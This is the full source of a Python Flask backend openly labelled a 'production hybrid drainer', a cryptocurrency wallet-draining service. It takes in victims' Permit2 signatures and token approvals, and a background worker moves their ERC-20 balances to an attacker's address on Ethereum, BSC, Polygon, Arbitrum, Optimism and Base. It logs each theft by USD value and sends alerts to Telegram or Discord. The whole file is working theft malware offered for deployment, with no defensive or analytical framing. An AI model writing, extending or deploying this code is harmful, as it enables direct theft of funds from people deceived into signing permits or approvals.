# app.py — production hybrid drainer (Permit2 + classic)
# Railway / GitHub ready | secrets via environment variables only
# language: Python 3.11+

import os
import json
import time
import sqlite3
import secrets
import traceback
import random
import threading
import asyncio
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from collections import defaultdict

from flask import Flask, jsonify, request
from web3 import Web3
from eth_account import Account
from eth_account.messages import encode_typed_data
import requests
import logging
from logging.handlers import RotatingFileHandler

VERSION = "8.1.0-RAILWAY"

# ──────────────────────────────────────────────
# Logging
# ──────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("drainer")

# ──────────────────────────────────────────────
# Chains
# ──────────────────────────────────────────────
CHAINS = {
    1: {"name": "Ethereum", "rpc": ["https://eth.llamarpc.com", "https://rpc.ankr.com/eth"], "eip1559": True},
    56: {"name": "BSC", "rpc": ["https://bsc-dataseed1.bnbchain.org:8545", "https://bsc-rpc.publicnode.com", "https://rpc.ankr.com/bsc"], "eip1559": False},
    137: {"name": "Polygon", "rpc": ["https://polygon-rpc.com", "https://rpc.ankr.com/polygon"], "eip1559": True},
    42161: {"name": "Arbitrum", "rpc": ["https://arb1.arbitrum.io/rpc"], "eip1559": True},
    10: {"name": "Optimism", "rpc": ["https://mainnet.optimism.io"], "eip1559": True},
    8453: {"name": "Base", "rpc": ["https://mainnet.base.org"], "eip1559": True},
}

PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}], "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_from", "type": "address"}, {"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
]

PERMIT2_ABI = [{
    "inputs": [
        {"components": [
            {"components": [{"name": "token", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "permitted", "type": "tuple"},
            {"name": "nonce", "type": "uint256"},
            {"name": "deadline", "type": "uint256"}
        ], "name": "permit", "type": "tuple"},
        {"components": [
            {"name": "to", "type": "address"},
            {"name": "requestedAmount", "type": "uint256"}
        ], "name": "transferDetails", "type": "tuple"},
        {"name": "owner", "type": "address"},
        {"name": "signature", "type": "bytes"}
    ],
    "name": "permitTransferFrom",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}]

# ──────────────────────────────────────────────
# Config from environment (Railway)
# ──────────────────────────────────────────────
@dataclass
class Config:
    drainer_address: str
    drainer_key: str
    processor_address: str
    processor_key: str
    telegram_token: str = ""
    telegram_chat: str = ""
    discord_webhook: str = ""
    simulate: bool = False
    gasless: bool = False
    use_permit2: bool = True
    use_classic: bool = True
    poll_interval: int = 6
    max_concurrent: int = 12
    gas_multiplier: float = 1.25
    port: int = 5000

def load_config() -> Config:
    def req(name: str) -> str:
        v = os.environ.get(name, "").strip()
        if not v:
            raise RuntimeError(f"Missing required env var: {name}")
        return v

    return Config(
        drainer_address=Web3.to_checksum_address(req("DRAINER_ADDRESS")),
        drainer_key=req("DRAINER_PRIVATE_KEY"),
        processor_address=Web3.to_checksum_address(req("PROCESSOR_ADDRESS")),
        processor_key=req("PROCESSOR_PRIVATE_KEY"),
        telegram_token=os.environ.get("TELEGRAM_TOKEN", ""),
        telegram_chat=os.environ.get("TELEGRAM_CHAT", ""),
        discord_webhook=os.environ.get("DISCORD_WEBHOOK", ""),
        simulate=os.environ.get("SIMULATE", "false").lower() in ("1", "true", "yes"),
        gasless=os.environ.get("GASLESS", "false").lower() in ("1", "true", "yes"),
        use_permit2=os.environ.get("USE_PERMIT2", "true").lower() in ("1", "true", "yes"),
        use_classic=os.environ.get("USE_CLASSIC", "true").lower() in ("1", "true", "yes"),
        poll_interval=int(os.environ.get("POLL_INTERVAL", "6")),
        max_concurrent=int(os.environ.get("MAX_CONCURRENT", "12")),
        gas_multiplier=float(os.environ.get("GAS_MULTIPLIER", "1.25")),
        port=int(os.environ.get("PORT", "5000")),
    )

# ──────────────────────────────────────────────
# Database (SQLite — fine for single Railway instance)
# ──────────────────────────────────────────────
class DB:
    def __init__(self, path: str = None):
        self.path = path or os.environ.get("DB_PATH", "/tmp/drainer.db")
        self.lock = threading.RLock()
        self._init()

    def _conn(self):
        c = sqlite3.connect(self.path, timeout=30, check_same_thread=False)
        c.execute("PRAGMA journal_mode=WAL")
        c.row_factory = sqlite3.Row
        return c

    def _init(self):
        with self.lock:
            c = self._conn()
            c.executescript("""
                CREATE TABLE IF NOT EXISTS jobs (
                    id INTEGER PRIMARY KEY,
                    job_id TEXT UNIQUE,
                    method TEXT,
                    victim TEXT,
                    token TEXT,
                    token_name TEXT,
                    amount TEXT,
                    usd_value REAL,
                    chain_id INTEGER,
                    signature TEXT,
                    nonce INTEGER,
                    deadline INTEGER,
                    status TEXT DEFAULT 'pending',
                    tx_hash TEXT,
                    error TEXT,
                    created_at TEXT,
                    updated_at TEXT,
                    attempt INTEGER DEFAULT 0
                );
                CREATE TABLE IF NOT EXISTS txs (
                    id INTEGER PRIMARY KEY,
                    tx_hash TEXT UNIQUE,
                    chain_id INTEGER,
                    method TEXT,
                    from_addr TEXT,
                    to_addr TEXT,
                    token TEXT,
                    amount TEXT,
                    status TEXT,
                    profit_usd REAL,
                    created_at TEXT
                );
                CREATE INDEX IF NOT EXISTS idx_jobs_status ON jobs(status);
            """)
            c.commit()
            c.close()
            logger.info("[+] DB ready at %s", self.path)

    def add_job(self, method, victim, token, token_name, amount, usd, chain_id,
                signature=None, nonce=None, deadline=None) -> str:
        jid = secrets.token_hex(8)
        now = datetime.utcnow().isoformat()
        with self.lock:
            c = self._conn()
            c.execute("""INSERT INTO jobs
                (job_id,method,victim,token,token_name,amount,usd_value,chain_id,
                 signature,nonce,deadline,status,created_at,updated_at)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,'pending',?,?)""",
                (jid, method, victim, token, token_name, str(amount), float(usd), int(chain_id),
                 signature, nonce, deadline, now, now))
            c.commit()
            c.close()
        return jid

    def pending(self, limit=30) -> List[Dict]:
        with self.lock:
            c = self._conn()
            rows = c.execute(
                "SELECT * FROM jobs WHERE status IN ('pending','retry') ORDER BY usd_value DESC LIMIT ?",
                (limit,)
            ).fetchall()
            c.close()
            return [dict(r) for r in rows]

    def update_job(self, jid, status, tx_hash=None, error=None):
        with self.lock:
            c = self._conn()
            c.execute("""UPDATE jobs SET status=?, tx_hash=COALESCE(?,tx_hash),
                          error=?, updated_at=?, attempt=attempt+1 WHERE job_id=?""",
                      (status, tx_hash, error, datetime.utcnow().isoformat(), jid))
            c.commit()
            c.close()

    def log_tx(self, tx_hash, chain_id, method, frm, to, token, amount, status, profit=0):
        with self.lock:
            c = self._conn()
            c.execute("""INSERT OR IGNORE INTO txs
                (tx_hash,chain_id,method,from_addr,to_addr,token,amount,status,profit_usd,created_at)
                VALUES (?,?,?,?,?,?,?,?,?,?)""",
                (tx_hash, chain_id, method, frm, to, token, str(amount), status, profit,
                 datetime.utcnow().isoformat()))
            c.commit()
            c.close()

    def stats(self) -> Dict:
        with self.lock:
            c = self._conn()
            drained = c.execute("SELECT COUNT(*) FROM jobs WHERE status='confirmed'").fetchone()[0]
            usd = c.execute("SELECT COALESCE(SUM(usd_value),0) FROM jobs WHERE status='confirmed'").fetchone()[0]
            pending = c.execute("SELECT COUNT(*) FROM jobs WHERE status IN ('pending','retry')").fetchone()[0]
            c.close()
            return {"drained": drained, "total_usd": float(usd), "pending": pending}

# ──────────────────────────────────────────────
# Chain + Gas
# ──────────────────────────────────────────────
class ChainManager:
    def __init__(self):
        self.web3s = {}
        self.idx = defaultdict(int)
        self.lock = threading.Lock()
        for cid in CHAINS:
            self._connect(cid)

    def _connect(self, cid):
        for i, url in enumerate(CHAINS[cid]["rpc"]):
            try:
                w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 12}))
                if w3.is_connected():
                    self.web3s[cid] = w3
                    self.idx[cid] = i
                    logger.info("[+] %s connected", CHAINS[cid]["name"])
                    return w3
            except Exception:
                continue
        logger.error("[-] no RPC for chain %s", cid)
        return None

    def get(self, cid):
        with self.lock:
            w3 = self.web3s.get(cid)
            if w3 and w3.is_connected():
                return w3
            return self._connect(cid)

    def rotate(self, cid):
        with self.lock:
            self.idx[cid] = (self.idx[cid] + 1) % len(CHAINS[cid]["rpc"])
            self._connect(cid)

class Gas:
    def __init__(self, cm: ChainManager):
        self.cm = cm

    def params(self, cid, mult=1.25):
        w3 = self.cm.get(cid)
        if not w3:
            return {"gasPrice": 5_000_000_000}
        try:
            if CHAINS[cid].get("eip1559"):
                block = w3.eth.get_block("latest")
                base = block.get("baseFeePerGas", 20_000_000_000)
                tip = getattr(w3.eth, "max_priority_fee", 2_000_000_000)
                return {
                    "maxFeePerGas": int(base * mult) + int(tip),
                    "maxPriorityFeePerGas": int(tip * 1.1),
                }
            return {"gasPrice": int(w3.eth.gas_price * mult)}
        except Exception:
            return {"gasPrice": 5_000_000_000}

# ──────────────────────────────────────────────
# Notifier
# ──────────────────────────────────────────────
class Notifier:
    def __init__(self, cfg: Config):
        self.cfg = cfg

    def send(self, title, body):
        if self.cfg.telegram_token and self.cfg.telegram_chat:
            try:
                requests.post(
                    f"https://api.telegram.org/bot{self.cfg.telegram_token}/sendMessage",
                    json={"chat_id": self.cfg.telegram_chat, "text": f"<b>{title}</b>\n{body}", "parse_mode": "HTML"},
                    timeout=8,
                )
            except Exception:
                pass
        if self.cfg.discord_webhook:
            try:
                requests.post(self.cfg.discord_webhook, json={"content": f"**{title}**\n{body}"}, timeout=8)
            except Exception:
                pass

# ──────────────────────────────────────────────
# Engine
# ──────────────────────────────────────────────
class Engine:
    def __init__(self, cfg: Config, db: DB, cm: ChainManager, gas: Gas, ntf: Notifier):
        self.cfg = cfg
        self.db = db
        self.cm = cm
        self.gas = gas
        self.ntf = ntf
        self.processor = Account.from_key(cfg.processor_key)
        self.running = False

    def drain_permit2(self, job: Dict) -> bool:
        cid = job["chain_id"]
        w3 = self.cm.get(cid)
        if not w3:
            self.db.update_job(job["job_id"], "retry", error="no rpc")
            return False

        if self.cfg.simulate:
            fake = "SIM-P2-" + secrets.token_hex(6)
            self.db.update_job(job["job_id"], "confirmed", tx_hash=fake)
            self.db.log_tx(fake, cid, "permit2", job["victim"], self.cfg.drainer_address,
                           job["token"], job["amount"], "confirmed", job["usd_value"])
            self.ntf.send("PERMIT2 SIM", f"{job['token_name']} ${job['usd_value']}")
            logger.info("[SIM-P2] %s %s", job["token_name"], job["amount"])
            return True

        try:
            amount = int(job["amount"])
            sig = job["signature"]
            if sig.startswith("0x"):
                sig = sig[2:]
            permit2 = w3.eth.contract(address=PERMIT2, abi=PERMIT2_ABI)
            permit = ((Web3.to_checksum_address(job["token"]), amount), int(job["nonce"]), int(job["deadline"]))
            transfer_details = (self.cfg.drainer_address, amount)
            nonce = w3.eth.get_transaction_count(self.processor.address)
            g = self.gas.params(cid, self.cfg.gas_multiplier)
            tx = permit2.functions.permitTransferFrom(
                permit, transfer_details,
                Web3.to_checksum_address(job["victim"]),
                bytes.fromhex(sig)
            ).build_transaction({
                "from": self.processor.address,
                "nonce": nonce,
                "chainId": cid,
                "gas": 220000,
                **g,
            })
            signed = self.processor.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction).hex()

            for _ in range(30):
                try:
                    rcpt = w3.eth.get_transaction_receipt(tx_hash)
                    if rcpt and rcpt["status"] == 1:
                        self.db.update_job(job["job_id"], "confirmed", tx_hash=tx_hash)
                        self.db.log_tx(tx_hash, cid, "permit2", job["victim"], self.cfg.drainer_address,
                                       job["token"], job["amount"], "confirmed", job["usd_value"])
                        self.ntf.send("PERMIT2 DRAIN", f"{job['token_name']} ${job['usd_value']}\n{tx_hash}")
                        logger.info("[P2] %s | %s | $%s", tx_hash, job["token_name"], job["usd_value"])
                        return True
                except Exception:
                    pass
                time.sleep(3)

            self.db.update_job(job["job_id"], "retry", tx_hash=tx_hash, error="no receipt")
            self.cm.rotate(cid)
            return False
        except Exception as e:
            logger.error("[-] Permit2 %s: %s", job["job_id"], e)
            self.db.update_job(job["job_id"], "retry", error=str(e)[:180])
            return False

    def drain_classic(self, job: Dict) -> bool:
        cid = job["chain_id"]
        w3 = self.cm.get(cid)
        if not w3:
            self.db.update_job(job["job_id"], "retry", error="no rpc")
            return False

        if self.cfg.simulate:
            fake = "SIM-CL-" + secrets.token_hex(6)
            self.db.update_job(job["job_id"], "confirmed", tx_hash=fake)
            self.db.log_tx(fake, cid, "classic", job["victim"], self.cfg.drainer_address,
                           job["token"], job["amount"], "confirmed", job["usd_value"])
            self.ntf.send("CLASSIC SIM", f"{job['token_name']} ${job['usd_value']}")
            logger.info("[SIM-CL] %s %s", job["token_name"], job["amount"])
            return True

        try:
            token = Web3.to_checksum_address(job["token"])
            victim = Web3.to_checksum_address(job["victim"])
            contract = w3.eth.contract(address=token, abi=ERC20_ABI)
            allowance = contract.functions.allowance(victim, self.processor.address).call()
            balance = contract.functions.balanceOf(victim).call()
            amount = min(allowance, balance)
            if amount == 0:
                self.db.update_job(job["job_id"], "failed", error="zero allowance/balance")
                return False

            nonce = w3.eth.get_transaction_count(self.processor.address)
            g = self.gas.params(cid, self.cfg.gas_multiplier)
            tx = contract.functions.transferFrom(
                victim, self.cfg.drainer_address, amount
            ).build_transaction({
                "from": self.processor.address,
                "nonce": nonce,
                "chainId": cid,
                "gas": 130000,
                **g,
            })
            signed = self.processor.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction).hex()

            for _ in range(30):
                try:
                    rcpt = w3.eth.get_transaction_receipt(tx_hash)
                    if rcpt and rcpt["status"] == 1:
                        self.db.update_job(job["job_id"], "confirmed", tx_hash=tx_hash)
                        self.db.log_tx(tx_hash, cid, "classic", victim, self.cfg.drainer_address,
                                       token, str(amount), "confirmed", job["usd_value"])
                        self.ntf.send("CLASSIC DRAIN", f"{job['token_name']} ${job['usd_value']}\n{tx_hash}")
                        logger.info("[CL] %s | %s | $%s", tx_hash, job["token_name"], job["usd_value"])
                        return True
                except Exception:
                    pass
                time.sleep(3)

            self.db.update_job(job["job_id"], "retry", tx_hash=tx_hash, error="no receipt")
            return False
        except Exception as e:
            logger.error("[-] Classic %s: %s", job["job_id"], e)
            self.db.update_job(job["job_id"], "retry", error=str(e)[:180])
            return False

    def process(self, job: Dict) -> bool:
        if job["method"] == "permit2" and self.cfg.use_permit2:
            return self.drain_permit2(job)
        if job["method"] == "classic" and self.cfg.use_classic:
            return self.drain_classic(job)
        self.db.update_job(job["job_id"], "failed", error="method disabled")
        return False

    def worker_loop(self):
        self.running = True
        logger.info("[+] Engine online")
        while self.running:
            try:
                jobs = self.db.pending(self.cfg.max_concurrent)
                for j in jobs:
                    self.process(j)
            except Exception as e:
                logger.error("[-] loop: %s", e)
            time.sleep(self.cfg.poll_interval)

# ──────────────────────────────────────────────
# Typed-data helper
# ──────────────────────────────────────────────
def build_permit2_typed_data(chain_id: int, token: str, amount: int, spender: str, nonce: int, deadline: int) -> dict:
    return {
        "types": {
            "EIP712Domain": [
                {"name": "name", "type": "string"},
                {"name": "chainId", "type": "uint256"},
                {"name": "verifyingContract", "type": "address"},
            ],
            "PermitTransferFrom": [
                {"name": "permitted", "type": "TokenPermissions"},
                {"name": "spender", "type": "address"},
                {"name": "nonce", "type": "uint256"},
                {"name": "deadline", "type": "uint256"},
            ],
            "TokenPermissions": [
                {"name": "token", "type": "address"},
                {"name": "amount", "type": "uint256"},
            ],
        },
        "primaryType": "PermitTransferFrom",
        "domain": {
            "name": "Permit2",
            "chainId": chain_id,
            "verifyingContract": PERMIT2,
        },
        "message": {
            "permitted": {
                "token": Web3.to_checksum_address(token),
                "amount": str(amount),
            },
            "spender": Web3.to_checksum_address(spender),
            "nonce": nonce,
            "deadline": deadline,
        },
    }

# ──────────────────────────────────────────────
# Flask app
# ──────────────────────────────────────────────
cfg = None
db = None
engine = None
cm = None

def create_app() -> Flask:
    global cfg, db, engine, cm
    cfg = load_config()
    db = DB()
    cm = ChainManager()
    gas = Gas(cm)
    ntf = Notifier(cfg)
    engine = Engine(cfg, db, cm, gas, ntf)

    # background engine
    t = threading.Thread(target=engine.worker_loop, daemon=True)
    t.start()

    app = Flask(__name__)

    @app.route("/")
    def root():
        return jsonify({"service": "drainer", "version": VERSION, "status": "ok"})

    @app.route("/health")
    def health():
        return jsonify({"status": "ok", "version": VERSION, "simulate": cfg.simulate})

    @app.route("/stats")
    def stats():
        return jsonify(db.stats())

    @app.route("/pending")
    def pending():
        return jsonify(db.pending(50))

    @app.route("/typed_data", methods=["POST"])
    def typed_data():
        d = request.json or {}
        for k in ("chain_id", "token", "amount", "nonce", "deadline"):
            if k not in d:
                return jsonify({"error": f"missing {k}"}), 400
        data = build_permit2_typed_data(
            int(d["chain_id"]), d["token"], int(d["amount"]),
            cfg.processor_address, int(d["nonce"]), int(d["deadline"])
        )
        return jsonify(data)

    @app.route("/permit2", methods=["POST"])
    def ingest_permit2():
        d = request.json or {}
        need = ["victim", "token", "token_name", "amount", "usd_value", "chain_id", "signature", "nonce", "deadline"]
        if not all(k in d for k in need):
            return jsonify({"error": "missing fields", "need": need}), 400
        jid = db.add_job(
            method="permit2",
            victim=d["victim"],
            token=d["token"],
            token_name=d["token_name"],
            amount=d["amount"],
            usd=d["usd_value"],
            chain_id=d["chain_id"],
            signature=d["signature"],
            nonce=d["nonce"],
            deadline=d["deadline"],
        )
        return jsonify({"job_id": jid, "method": "permit2"})

    @app.route("/classic", methods=["POST"])
    def ingest_classic():
        d = request.json or {}
        need = ["victim", "token", "token_name", "amount", "usd_value", "chain_id"]
        if not all(k in d for k in need):
            return jsonify({"error": "missing fields"}), 400
        jid = db.add_job(
            method="classic",
            victim=d["victim"],
            token=d["token"],
            token_name=d["token_name"],
            amount=d["amount"],
            usd=d["usd_value"],
            chain_id=d["chain_id"],
        )
        return jsonify({"job_id": jid, "method": "classic"})

    @app.route("/force/<job_id>", methods=["POST"])
    def force(job_id):
        jobs = db.pending(100)
        job = next((j for j in jobs if j["job_id"] == job_id), None)
        if not job:
            return jsonify({"error": "not found"}), 404
        ok = engine.process(job)
        return jsonify({"success": ok})

    return app

app = create_app()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=cfg.port, threaded=True)
